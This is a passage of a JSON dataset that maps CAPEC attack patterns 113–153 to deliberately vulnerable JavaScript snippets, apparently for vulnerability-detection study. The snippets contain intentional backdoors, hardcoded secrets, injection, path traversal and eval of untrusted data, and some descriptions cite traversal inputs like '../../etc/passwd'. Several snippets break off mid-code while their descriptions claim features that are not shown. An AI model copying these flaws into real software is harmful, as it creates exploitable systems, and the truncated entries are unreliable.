        "description": "This vulnerable code demonstrates multiple security weaknesses including weak password hashing, no rate limiting for authentication attempts, insufficient randomness in PIN generation, and brute force vulnerability. The authentication system can be defeated through exhaustive trial-and-error attempts."
    },
    {
        "capec_id": "113",
        "capec_name": "Interface Manipulation",
        "code_snippet": "`\n    class SoCInterface {\n      constructor() {\n        this.registers = new Map();\n        this.debugMode = false;",
        "description": "\"This code demonstrates vulnerable interface manipulation in a simulated System-on-Chip (SoC) JavaScript implementation. It includes unprotected IOCTL operations, lack of access control for register interfaces, exposed debug functionality that can be enabled at runtime, and unprotected shadow register access. The code lacks proper authentication and authorization checks, allowing unauthorized access to critical hardware functions.\""
    },
    {
        "capec_id": "114",
        "capec_name": "Authentication Abuse",
        "code_snippet": "class AuthenticationService {\n    constructor() {\n        this.failedAttempts = {};\n        this.debugMode = true;\n    }\n\n    login(username, password) {\n        // Debug backdoor - highly insecure\n        if (this.debugMode && password.includes('debug_')) {\n            return { authenticated: true, user: { id: 1, role: 'admin' } };\n        }\n\n        // Weak password check\n        if (password.length >= 3) {\n            // No rate limiting implemented\n            if (!this.failedAttempts[username]) {\n                this.failedAttempts[username] = 0;\n            }\n\n            // Basic authentication without proper validation\n            if (username === 'admin' && password === 'pass123') {\n                this.failedAttempts[username] = 0;\n                return { authenticated: true, user: { id: 1, role: 'admin' } };\n            }\n\n            this.failedAttempts[username]++;\n        }\n\n        return { authenticated: false };\n    }\n}",
        "description": "This vulnerable authentication implementation contains multiple security flaws: a debug backdoor that bypasses normal authentication, no rate limiting for failed attempts, weak password validation, hardcoded credentials, and insufficient identity verification. The debug mode remains enabled in production, exposing internal assets to unauthorized access."
    },
    {
        "capec_id": "115",
        "capec_name": "Authentication Bypass",
        "code_snippet": "`\nconst express = require('express');\nconst app = express();\n\n// Weak authentication system with bypass vulnerability\nfunction authenticateUser(req) {\n  // Assumes debug parameter is immutable and trusted\n  if (req.query.debug === 'true') {\n    return { isAdmin: true",
        "description": "\"A vulnerable authentication implementation that can be bypassed through multiple vectors: using a debug parameter, providing any non-empty authorization token, or setting an internal request header. The code assumes certain parameters are immutable and trustworthy, fails to properly validate credentials, and provides multiple authentication paths without proper security checks.\""
    },
    {
        "capec_id": "116",
        "capec_name": "Excavation",
        "code_snippet": "`\n    function searchUserData(searchPath) {\n      const fs = require('fs');\n      const searchTerm = process.argv[2] || '';\n      \n      // Debug mode flag exposed\n      const DEBUG_MODE = true;\n      \n      // Sensitive configuration and credentials\n      const config = {\n        apiKey: 'sk_live_123456789',\n        dbPassword: 'admin123',\n        userDataPath: searchPath",
        "description": "\"This code demonstrates information exposure through debug logging, use of untrusted search paths, sensitive data exposure, and attempts to replicate files across directories. It includes hardcoded credentials, uncontrolled debug mode, and creates emergent resources through temporary files.\""
    },
    {
        "capec_id": "117",
        "capec_name": "Interception",
        "code_snippet": "// Create an insecure WebSocket connection\nconst ws = new WebSocket('ws://example.com/sensitive');\n\n// Send sensitive data in cleartext\nfunction sendSensitiveData() {\n    const userData = {\n        username: 'john_doe',\n        password: 'secret123',\n        creditCard: '4111-1111-1111-1111',\n        ssn: '123-45-6789'\n    };\n\n    // Transmit without encryption or integrity checks\n    ws.send(JSON.stringify(userData));\n\n    // Set up large data transmission without volume control\n    setInterval(() => {\n        const largePayload = 'x'.repeat(1000000);\n        ws.send(largePayload);\n    }, 100);\n}\n\n// Listen for messages without verifying source or integrity\nws.onmessage = function(event) {\n    eval(event.data); // Potentially dangerous execution\n};",
        "description": "This code demonstrates vulnerable data transmission practices including cleartext transmission of sensitive data, lack of message integrity checks, and insufficient network traffic volume control. It uses an insecure WebSocket connection, sends sensitive personal information without encryption, processes received messages without verification, and implements a potential network amplification vulnerability through unconstrained large payload transmission."
    },
    {
        "capec_id": "120",
        "capec_name": "Double Encoding",
        "code_snippet": "function validateAndProcessUserInput(userInput) {\n  // Flawed validation: only checks for single-encoded values\n  function isSafeInput(input) {\n    const disallowedPatterns = ['%2E', '%2F', '%5C'];\n    return !disallowedPatterns.some(pattern => input.includes(pattern));\n  }\n\n  // Vulnerable path traversal handler\n  function processPath(input) {\n    const decodedPath = decodeURIComponent(input);\n    return 'data/' + decodedPath;\n  }\n\n  // Validation occurs before complete decoding\n  if (isSafeInput(userInput)) {\n    return processPath(userInput);\n  }\n  return 'Invalid input';\n}",
        "description": "This code demonstrates vulnerability to double encoding attacks by validating input before complete decoding and using an incomplete denylist. It fails to detect double-encoded sequences like '%252E' (double-encoded '.') or '%252F' (double-encoded '/'), which could lead to path traversal attacks. The validation occurs too early in the process, before all encoding layers are properly decoded."
    },
    {
        "capec_id": "121",
        "capec_name": "Exploit Non-Production Interfaces",
        "code_snippet": "// Production API server code\nconst express = require('express');\nconst app = express();\n\nconst DEBUG_MODE = true;\nconst DEBUG_KEY = 'debug123';\n\napp.get('/api/users', (req, res) => {\n  const data = getAllUsers();\n  \n  if (DEBUG_MODE && req.query.debug === DEBUG_KEY) {\n    // Debug endpoint exposing sensitive information\n    res.json({\n      users: data,\n      system_info: {\n        db_connection: process.env.DB_CONNECTION,\n        api_keys: process.env.API_KEYS,\n        debug_tokens: generateDebugTokens(),\n        test_accounts: getTestAccounts()\n      },\n      debug_trace: new Error().stack\n    });\n  } else {\n    res.json({ users: data });\n  }\n});\n\nfunction generateDebugTokens() {\n  return {\n    admin_override: 'secretkey123',\n    test_mode: true,\n    reserved_bits: '0xFFFF' // Reserved for debug purposes\n  };\n}\n\napp.listen(3000);",
        "description": "This code demonstrates a vulnerable implementation where debug/test functionality is left enabled in production. It includes an active debug mode with a simple key-based authentication, exposing sensitive system information, debug tokens, and test accounts through a debug interface. The code also shows improper handling of debug tokens and system identifiers, making it possible for unauthorized users to access development features that should not be available in production."
    },
    {
        "capec_id": "122",
        "capec_name": "Privilege Abuse",
        "code_snippet": "`\n// Admin panel access control implementation\nclass UserAuth {\n  constructor() {\n    this.currentUser = null;",
        "description": "\"This code demonstrates improper privilege management by implementing a flawed access control system. The authentication mechanism only checks if a user is logged in, without verifying their role or privilege level. This allows any authenticated user to access administrative functions that should be restricted to privileged users only. The code lacks proper permission checks, role-based access control, and proper isolation of privileged functionality.\""
    },
    {
        "capec_id": "123",
        "capec_name": "Buffer Manipulation",
        "code_snippet": "function copyUserData(sourceBuffer, targetBuffer, offset) {\n    // No validation of offset or buffer sizes\n    for(let i = 0; i < sourceBuffer.length; i++) {\n        targetBuffer[offset + i] = sourceBuffer[i];\n    }\n}\n\nlet sensitiveData = new Uint8Array([1, 2, 3, 4]);\nlet userBuffer = new Uint8Array(2);\n\n// Potential buffer overflow - reading/writing beyond bounds\ncopyUserData(userBuffer, sensitiveData, -1);",
        "description": "This code demonstrates a vulnerable buffer manipulation function that doesn't validate buffer boundaries or offset values. It allows reading from and writing to memory locations outside the intended buffer bounds through invalid offsets and mismatched buffer sizes, potentially leading to buffer overflows and unauthorized memory access."
    },
    {
        "capec_id": "124",
        "capec_name": "Shared Resource Manipulation",
        "code_snippet": "`\n    // Shared resource between worker threads\n    let sharedBuffer = new SharedArrayBuffer(1024);\n    let sharedArray = new Int32Array(sharedBuffer);\n\n    // Main thread\n    let worker1 = new Worker('worker1.js');\n    let worker2 = new Worker('worker2.js');\n\n    // Unsynchronized access to shared resource\n    worker1.postMessage({ buffer: sharedBuffer",
        "description": "\"This code demonstrates vulnerable shared resource access between multiple worker threads. It creates a SharedArrayBuffer that's accessed by two worker threads without proper synchronization mechanisms, leading to potential race conditions and data corruption. The lack of mutex locks or atomic operations allows simultaneous uncontrolled access to shared memory, making it susceptible to timing attacks and data manipulation.\""
    },
    {
        "capec_id": "125",
        "capec_name": "Flooding",
        "code_snippet": "`\n    const net = require('net');\n    const server = net.createServer();\n\n    server.on('connection', (socket) => {\n        // No limit on number of connections\n        socket.on('data', (data) => {\n            // Process data without any rate limiting\n            let response = processLargeData(data);\n            socket.write(response);",
        "description": "\"This vulnerable code implements a TCP server that accepts unlimited connections and processes data without any rate limiting or resource constraints. For each connection, it allocates memory proportional to the input size multiplied by 100, making it susceptible to memory exhaustion through flood attacks. The server lacks connection pooling, resource cleanup, and traffic volume controls.\""
    },
    {
        "capec_id": "126",
        "capec_name": "Path Traversal",
        "code_snippet": "const fs = require('fs');\nconst express = require('express');\nconst app = express();\n\napp.get('/download', (req, res) => {\n    const userProvidedPath = req.query.filename;\n    const filePath = './files/' + userProvidedPath;\n    \n    try {\n        const fileContent = fs.readFileSync(filePath);\n        res.send(fileContent);\n    } catch(err) {\n        res.status(404).send('File not found');\n    }\n});",
        "description": "This code demonstrates a path traversal vulnerability in a Node.js/Express application where user input is directly concatenated to form a file path without proper validation or sanitization. An attacker can use '../' sequences in the filename parameter to access files outside the intended directory, such as '../../etc/passwd' or '..\\..\\Windows\\System32\\config\\SAM'."
    },
    {
        "capec_id": "127",
        "capec_name": "Directory Indexing",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.get('/files/*', (req, res) => {\n    const requestedPath = path.join(__dirname, 'uploads', req.params[0]);\n    const fs = require('fs');\n    \n    if (fs.existsSync(requestedPath)) {\n        if (fs.lstatSync(requestedPath).isDirectory()) {\n            fs.readdir(requestedPath, (err, files) => {\n                res.json(files);\n            });\n        } else {\n            res.sendFile(requestedPath);\n        }\n    } else {\n        res.status(404).send('Not found');\n    }\n});\n\napp.listen(3000);",
        "description": "This code demonstrates a vulnerable directory listing implementation where any user can request the contents of any directory under the 'uploads' folder. The code lacks authentication and authorization checks, allowing directory traversal and unauthorized access to potentially sensitive files and directories. It directly exposes file and directory names without any access control or filtering."
    },
    {
        "capec_id": "128",
        "capec_name": "Integer Attacks",
        "code_snippet": "function calculateBonus(salary, bonusPercent) {\n    // Convert percentage to decimal and multiply\n    let bonus = salary * (bonusPercent / 100);\n    \n    // Add bonus to original salary\n    let totalCompensation = salary + bonus;\n    \n    // Check if total is within maximum limit (2^31 - 1)\n    if (totalCompensation <= 2147483647) {\n        return totalCompensation;\n    }\n    return salary; // Return original salary if overflow detected\n}",
        "description": "This vulnerable code calculates employee compensation with a bonus percentage. It fails to properly handle integer overflow cases where large salaries and bonus percentages could cause the totalCompensation to wrap around to negative values. It also doesn't check for minimum values or handle sign extension issues when converting between number types. The arbitrary maximum limit check is insufficient to prevent all overflow scenarios."
    },
    {
        "capec_id": "129",
        "capec_name": "Pointer Manipulation",
        "code_snippet": "function processUserData(userInput) {\n    let buffer = new Uint8Array(10);\n    let offset = parseInt(userInput);\n    \n    // Unsafe pointer arithmetic based on user input\n    let ptr = buffer.byteOffset + offset;\n    \n    // Attempt to access memory outside buffer bounds\n    let dataView = new DataView(buffer.buffer);\n    try {\n        // Potentially accessing memory outside allocated space\n        for(let i = 0; i < 20; i++) {\n            dataView.setInt8(ptr + i, 0x41);\n        }\n    } catch(e) {}\n    \n    // Potentially dereferencing null or invalid pointer\n    let arrayPtr = null;\n    if(offset > 100) {\n        arrayPtr = buffer;\n    }\n    return arrayPtr[0];\n}",
        "description": "This code demonstrates vulnerable pointer manipulation through user-controlled offset calculations, buffer overflow potential, and null pointer dereferencing. It attempts to perform unsafe memory access by manipulating buffer offsets and pointers without proper bounds checking, potentially leading to memory corruption or application crashes."
    },
    {
        "capec_id": "130",
        "capec_name": "Excessive Allocation",
        "code_snippet": "class ResourceManager {\n  constructor() {\n    this.resources = [];\n  }\n\n  allocateResource(size) {\n    // No limit checking on allocation size\n    let buffer = Buffer.alloc(size);\n    this.resources.push(buffer);\n    return buffer;\n  }\n\n  processRequest(data) {\n    // Vulnerable: No validation on input size\n    // Attacker can request arbitrarily large allocations\n    let size = data.requestedSize;\n    let count = data.allocationCount || 1;\n\n    for(let i = 0; i < count; i++) {\n      this.allocateResource(size);\n    }\n\n    // Resources are never freed\n    return { status: 'allocated' };\n  }\n}\n\n// Usage that could lead to resource exhaustion\nlet manager = new ResourceManager();\nmanager.processRequest({\n  requestedSize: Number.MAX_SAFE_INTEGER,\n  allocationCount: 100\n});",
        "description": "This code demonstrates multiple resource management vulnerabilities. It allows unbounded memory allocation without limits or validation, doesn't implement proper resource cleanup, and permits sequential allocations without total memory consumption tracking. The code can be exploited by requesting extremely large or numerous allocations, leading to system resource exhaustion with minimal requests."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "function processUserUploads() {\n    const fs = require('fs');\n    const tempFiles = [];\n    \n    function handleUpload(file) {\n        const fileStream = fs.createReadStream(file);\n        tempFiles.push(fileStream);\n        \n        // Process the file without closing streams\n        fileStream.on('data', (chunk) => {\n            // Process chunk\n            console.log('Processing chunk...');\n        });\n        \n        // No cleanup of file streams\n        // Missing fileStream.close()\n    }\n    \n    // Create multiple file handles without releasing\n    setInterval(() => {\n        handleUpload('user_upload.txt');\n    }, 1000);\n}\n\nprocessUserUploads();",
        "description": "This code creates a resource leak by repeatedly opening file streams without properly closing them. Each iteration creates a new file stream that is stored in memory but never released, leading to accumulation of open file handles. Over time, this will consume system resources until the system runs out of available file handles or memory, making it unavailable for legitimate operations."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processUserFile(userInput) {\n    const filePath = path.join('/user/data/', userInput);\n    \n    // Check if file exists before processing\n    if (fs.existsSync(filePath)) {\n        // Time gap between check and access (TOCTOU)\n        const data = fs.readFileSync(filePath);\n        // Process the data\n        return data;\n    }\n    return null;\n}",
        "description": "This code demonstrates vulnerable symlink handling by checking file existence before access without proper safeguards against symlink or hardlink manipulation. The time gap between checking and accessing creates a race condition where an attacker could replace the target file with a symlink to an unauthorized file between the check and access operations."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "class Application {\n  constructor() {\n    this._secretKey = 'sk_live_12345';\n    this._debugMode = false;\n  }\n\n  processRequest(options) {\n    try {\n      if (options.includes('--debug')) {\n        this._debugMode = true;\n        console.log('Debug info:', {\n          secretKey: this._secretKey,\n          environment: process.env,\n          configSettings: this._getInternalConfig()\n        });\n      }\n\n      if (options.includes('--hidden-admin')) {\n        this._enableAdminMode();\n      }\n\n      // Normal request processing\n      return 'Request processed';\n    } catch (err) {\n      // Unsafe error handling exposing internal details\n      return `Error occurred: ${err.stack}`;\n    }\n  }\n\n  _getInternalConfig() {\n    return {\n      dbPassword: 'db_password_123',\n      apiKeys: ['key1', 'key2'],\n      internalEndpoints: ['/admin', '/debug', '/hidden']\n    };\n  }\n\n  _enableAdminMode() {\n    // Undocumented admin functionality\n    console.log('Admin mode enabled');\n    return true;\n  }\n}",
        "description": "This vulnerable code demonstrates an application class that contains hidden functionality and debug options which, when discovered, can leak sensitive information. The code has undocumented admin features, exposes internal configuration through debug mode, and implements poor error handling that could reveal stack traces. It lacks proper input validation for command options and exposes deep internal components directly through debug output."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "function sendCustomEmail(to, subject, body) {\n    const emailHeaders = {\n        'To': to,\n        'Subject': subject,\n        'Content-Type': 'text/plain'\n    };\n    \n    // Vulnerable: No sanitization of user input for SMTP injection\n    const rawEmail = `To: ${to}\nSubject: ${subject}\n\n${body}`;\n    \n    const smtpConnection = connectToSMTP('smtp.example.com');\n    smtpConnection.send(rawEmail);\n}",
        "description": "This code is vulnerable to email header injection by allowing unfiltered user input to be directly inserted into email headers. An attacker could inject newlines (CRLF) and additional headers to manipulate the email structure, potentially adding BCC recipients or modifying the message content. The code fails to escape or neutralize special characters and protocol delimiters in the email headers and body."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "function displayUserProfile(userInput) {\n  const formatString = userInput || '%s %s';\n  const username = 'admin';\n  const role = 'user';\n  \n  // Vulnerable: directly using user-controlled format string\n  console.log(formatString.replace(/%s/g, (match) => {\n    let value = arguments[0];\n    // Potentially exposing memory contents\n    return value || 'undefined';\n  }));\n}",
        "description": "This code accepts a user-controlled format string and attempts to process it similar to printf-style formatting, which can lead to information disclosure if malicious format specifiers are provided. The code fails to validate the input format string and blindly processes any %s specifiers, potentially exposing unintended memory contents or program data."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "const ldap = require('ldapjs');\nconst client = ldap.createClient({\n    url: 'ldap://localhost:389'\n});\n\nfunction authenticateUser(username, password) {\n    const filter = '(uid=' + username + ')';\n    client.search('dc=example,dc=com', {\n        filter: filter,\n        scope: 'sub'\n    }, function(err, res) {\n        res.on('searchEntry', function(entry) {\n            client.bind(entry.dn, password, function(err) {\n                if (err) {\n                    console.log('Authentication failed');\n                } else {\n                    console.log('Authenticated successfully');\n                }\n            });\n        });\n    });\n}",
        "description": "This code is vulnerable to LDAP injection as it directly concatenates user input (username) into the LDAP filter string without any sanitization. An attacker could input special characters like '*(', causing the query to return all users in the system, or other LDAP operators to manipulate the query logic."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/user', (req, res) => {\n    const userId = req.query.id;\n    const userQuery = `SELECT * FROM users WHERE id=${userId}`;\n    \n    // Execute database query with unvalidated query parameter\n    database.query(userQuery, (err, result) => {\n        if (err) {\n            res.status(500).send('Error');\n            return;\n        }\n        res.send(result);\n    });\n});\n\napp.listen(3000);",
        "description": "This vulnerable code accepts user input through HTTP GET query parameters without proper validation or sanitization. An attacker can manipulate the 'id' parameter by injecting additional query parameters or SQL commands, potentially leading to SQL injection or parameter pollution attacks. The code directly interpolates user input into a SQL query string and uses GET method with sensitive information exposed in the URL."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "class UserService {\n  constructor() {\n    this.sensitiveData = { admin: 'secret_key' };\n  }\n\n  getData(field) {\n    // Vulnerable reflection using eval to dynamically access properties\n    return eval('this.sensitiveData.' + field);\n  }\n}\n\nconst userService = new UserService();\nconst userInput = 'admin';\n\n// Vulnerable usage allows arbitrary property access\nconst result = userService.getData(userInput);",
        "description": "A vulnerable JavaScript implementation demonstrating unsafe reflection through eval(), where user input is directly used to access object properties dynamically without proper validation. This allows attackers to inject malicious expressions and access unauthorized data through reflection-style attacks."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "const fs = require('fs');\nconst express = require('express');\nconst app = express();\n\napp.get('/download', (req, res) => {\n    const userPath = req.query.filepath;\n    const filePath = './files/' + userPath;\n    \n    if (fs.existsSync(filePath)) {\n        const fileContent = fs.readFileSync(filePath);\n        res.send(fileContent);\n    } else {\n        res.status(404).send('File not found');\n    }\n});",
        "description": "This code is vulnerable to path traversal as it directly concatenates user input to form a file path without sanitization. An attacker can use sequences like '../' to access files outside the intended directory (e.g., '?filepath=../../../../etc/passwd'). The code lacks proper path validation and normalization, making it susceptible to all variants of path traversal attacks described in the CWEs."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "`\nconst formSequenceHandler = {\n    currentStep: 1,\n    formData: {",
        "description": "\"This code demonstrates a vulnerable form sequence handler that allows direct access to any form step without verifying previous steps completion, lacks CSRF protection, and doesn't validate form state or user authorization. It accepts external form names without validation and processes orders without verifying ownership.\""
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "// Simple web cache implementation\nclass WebCache {\n    constructor() {\n        this.cache = {};\n    }\n\n    fetchData(url) {\n        if (this.cache[url]) {\n            return this.cache[url];\n        }\n\n        // Vulnerable: No origin validation or data authenticity check\n        let response = fetch(url)\n            .then(res => res.json())\n            .then(data => {\n                // Stores data without verification\n                this.cache[url] = data;\n                return data;\n            });\n\n        return response;\n    }\n\n    // Vulnerable: Allows direct cache manipulation\n    setCacheEntry(url, data) {\n        this.cache[url] = data;\n    }\n\n    // Vulnerable: Exposes sensitive cache data\n    getAllCachedData() {\n        return this.cache;\n    }\n}",
        "description": "This vulnerable code implements a basic web cache that accepts and stores data without proper verification of its authenticity or origin. It allows direct manipulation of cache entries and exposes all cached data, potentially including sensitive information. The cache can be poisoned by setting malicious data that will be treated as trusted by subsequent requests."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "function dnsResolver(domainName) {\n    // Simulate DNS cache lookup without verification\n    let dnsCache = {\n        'www.bank.com': '10.0.0.99',  // Compromised cache entry\n        'login.bank.com': '10.0.0.100'  // Malicious IP\n    };\n\n    // Insecure DNS resolution without source validation\n    function resolveDomain(domain) {\n        let ip = dnsCache[domain];\n        if (!ip) {\n            // Fallback to potentially compromised external DNS\n            ip = externalDNSLookup(domain);\n            dnsCache[domain] = ip;  // Cache poisoning possible\n        }\n        return ip;\n    }\n\n    function externalDNSLookup(domain) {\n        // Simulated external DNS lookup without authenticity checks\n        return '192.168.1.1';\n    }\n\n    // Vulnerable reverse DNS lookup\n    function reverseResolve(ip) {\n        // No validation of IP-hostname association\n        return 'www.bank.com';\n    }\n\n    let ip = resolveDomain(domainName);\n    let hostname = reverseResolve(ip);\n    \n    return {\n        ip: ip,\n        hostname: hostname\n    };\n}",
        "description": "This code demonstrates a vulnerable DNS resolver implementation that lacks proper verification of DNS responses, allows cache poisoning, and performs insecure reverse DNS lookups. It trusts potentially compromised DNS cache entries and external DNS responses without validation, making it susceptible to DNS spoofing attacks."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "// Server-side directory structure\nconst express = require('express');\nconst app = express();\n\napp.use('/public', express.static('public'));\napp.use('/uploads', express.static('uploads'));\napp.use('/backups', express.static('backups'));\n\n// Sensitive files stored in accessible locations\nconst sensitiveFiles = {\n    '/uploads/users.csv': 'user_data.csv',\n    '/backups/db_backup.sql': 'database_backup.sql',\n    '/.git': 'git_repository',\n    '/public/admin/config.js': 'admin_configuration.js'\n};\n\n// No authentication check for file access\napp.get('/:folder/:file', (req, res) => {\n    const path = `${req.params.folder}/${req.params.file}`;\n    if (sensitiveFiles[path]) {\n        res.sendFile(sensitiveFiles[path]);\n    }\n});",
        "description": "This vulnerable code demonstrates improper access control by exposing sensitive directories and files through direct URL access. It places sensitive files under web-accessible directories, exposes version control repositories, and lacks proper authorization checks for restricted resources. The code allows direct browsing of potentially sensitive paths without authentication or authorization verification."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "`// Hidden web service endpoint with sensitive operations\nconst express = require('express');\nconst app = express();\n\n// Undocumented API endpoints without proper authentication\napp.get('/internal/admin', (req, res) => {\n  const userData = {\n    username: 'admin',\n    apiKey: 'secret_key_123',\n    dbConnection: 'mongodb://admin:pass@localhost:27017'",
        "description": "\"This code demonstrates multiple vulnerabilities related to hidden web services and improper access controls. It includes undocumented API endpoints exposing sensitive data, unprotected WSDL documentation, and unsafe dynamic code loading. The endpoints lack proper authentication and authorization, and sensitive information is exposed without access controls.\""
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "`\nfunction sendMessageWithChecksum(message) {\n    // Weak hash function using simple sum of character codes\n    function weakHash(data) {\n        return data.split('').reduce((sum, char) => sum + char.charCodeAt(0), 0);",
        "description": "\"This code demonstrates a vulnerable message integrity system using a weak checksum implementation. The vulnerabilities include: using a weak hash function (CWE-328), lack of proper integrity validation (CWE-354), and insufficient message integrity protection during transmission (CWE-924). The code allows an attacker to modify both the message and compute a valid checksum using the known weak algorithm, successfully bypassing the integrity check.\""
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst xpath = require('xpath');\nconst dom = require('xmldom').DOMParser;\n\napp.get('/userProfile', (req, res) => {\n    const userSchema = req.query.schema;\n    const userXml = req.query.userdata;\n    \n    try {\n        const doc = new dom().parseFromString(userXml);\n        const schemaDoc = new dom().parseFromString(userSchema);\n        \n        // Vulnerable: No schema validation\n        // Vulnerable: Direct use of user input in XPath\n        const query = '//user[@id=\"' + req.query.id + '\"]/details';\n        const nodes = xpath.select(query, doc);\n        \n        res.json({ data: nodes[0].toString() });\n    } catch(e) {\n        res.status(500).send('Error processing XML');\n    }\n});",
        "description": "This code demonstrates multiple vulnerabilities related to XML processing and schema validation. It accepts an XML schema and document from user input without proper validation, allowing for schema poisoning. The code also contains an XPath injection vulnerability by directly incorporating user input into the XPath query string. Additionally, there's no proper XML validation against a trusted schema, allowing for potentially malicious XML content to be processed."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst xml2js = require('xml2js');\n\napp.post('/process-xml', express.raw({type: 'application/xml'}), (req, res) => {\n    const xmlParser = new xml2js.Parser();\n    \n    // No input validation or request limits\n    xmlParser.parseString(req.body, (err, result) => {\n        if (err) {\n            res.status(500).send('Error');\n            return;\n        }\n        \n        // Resource-intensive processing without limits\n        for (let item of result.items.item) {\n            let processed = deepProcess(item);\n            storeInMemory(processed);\n        }\n        \n        res.send('Processed');\n    });\n});\n\nconst deepProcess = (item) => {\n    // Simulate heavy processing\n    let result = item;\n    for(let i = 0; i < 1000; i++) {\n        result = JSON.parse(JSON.stringify(result));\n    }\n    return result;\n};\n\nconst storage = [];\nconst storeInMemory = (data) => {\n    storage.push(data); // Unbounded memory growth\n};\n\napp.listen(3000);",
        "description": "This vulnerable code implements an XML processing endpoint that accepts XML data without size limits, schema validation, or rate limiting. It performs resource-intensive processing on each element and stores results in memory without bounds, making it susceptible to XML-based DoS attacks through resource exhaustion."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "// Server-side code handling content update\napp.post('/update-content', function(req, res) {\n    let contentId = req.body.contentId;\n    let newContent = req.body.content;\n    \n    // Vulnerable: No authentication check\n    // Vulnerable: No CSRF token validation\n    // Vulnerable: No origin verification\n    database.updateContent(contentId, newContent, function(err) {\n        if (err) {\n            res.status(500).send('Error updating content');\n        } else {\n            res.send('Content updated successfully');\n        }\n    });\n});\n\n// Client-side code that loads and displays content\nfunction loadContent(contentId) {\n    fetch('/get-content?id=' + contentId)\n        .then(response => response.text())\n        .then(content => {\n            // Vulnerable: No content sanitization\n            // Vulnerable: Direct insertion of raw HTML\n            document.getElementById('content-area').innerHTML = content;\n        });\n}",
        "description": "This code demonstrates content spoofing vulnerabilities through an unsecured content management system. The server-side code allows content updates without proper authentication or CSRF protection, while the client-side code renders content without sanitization. This enables attackers to modify content either through unauthorized direct POST requests or by exploiting CSRF vulnerabilities. The lack of content validation and direct HTML insertion also makes it susceptible to XSS attacks."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\nconst path = require('path');\n\nfunction createTempLog(userData) {\n    const timestamp = Date.now();\n    const tempFileName = `app_log_${timestamp}.txt`;\n    const tempPath = path.join(os.tmpdir(), tempFileName);\n    \n    // Write sensitive data to predictable temp file\n    fs.writeFileSync(tempPath, `User data: ${userData}\\n`, { mode: 0o666 });\n    \n    // Process data\n    processUserData(tempPath);\n    \n    // Attempt to delete but file might still exist\n    try {\n        fs.unlinkSync(tempPath);\n    } catch(e) {}\n}",
        "description": "This code creates a temporary file with predictable naming pattern in the system's temp directory, using insecure permissions (666). The file name is based on timestamp making it somewhat predictable. The code writes sensitive user data to this file and fails to properly handle file cleanup, leaving it potentially accessible to attackers. The file is created with world-readable permissions in a shared directory."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "const fs = require('fs');\nconst config = {\n    secretKey: 'private_key_123',\n    userCredentials: {\n        admin: 'admin123',\n        root: 'root456'\n    }\n};\n\n// Write sensitive configuration to predictable location\nfs.writeFileSync('/etc/app/config.json', JSON.stringify(config));\n\n// Attempt to clear sensitive data but leave traces\nfunction clearSensitiveData() {\n    config.secretKey = null;\n    config.userCredentials = {};\n    // File remains in predictable location\n    // Memory may retain old values\n}\n\n// Debug function that exposes system information\nfunction debugMode() {\n    const systemInfo = {\n        config: config,\n        environment: process.env,\n        paths: process.mainModule.paths\n    };\n    fs.writeFileSync('/tmp/debug.log', JSON.stringify(systemInfo));\n}",
        "description": "This vulnerable code writes sensitive configuration data to a predictable location (/etc/app/config.json), fails to properly clear sensitive data from memory, and leaves debug information in accessible locations. The code demonstrates improper data scrubbing, exposure of sensitive information through debug logs, and usage of well-known directory paths that could be exploited."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "const users = new Map();\nusers.set('admin@example.com', 'admin123');\n\nfunction authenticate(email, clientIP) {\n    // Vulnerable: Assumes IP-based authentication is sufficient\n    const trustedIPs = ['192.168.1.1', '10.0.0.1'];\n    \n    if (trustedIPs.includes(clientIP)) {\n        // Automatically grants admin access based on IP alone\n        return {\n            isAuthenticated: true,\n            role: 'admin',\n            email: 'admin@example.com'\n        };\n    }\n\n    // No password verification, only checks if email exists\n    return {\n        isAuthenticated: users.has(email),\n        role: 'user',\n        email: email\n    };\n}",
        "description": "This code demonstrates identity spoofing vulnerabilities through weak authentication mechanisms. It trusts client IP addresses without proper verification, assumes IP addresses are immutable, and performs insufficient identity validation by only checking if an email exists. The code allows authentication bypass through IP spoofing and lacks proper credential verification."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
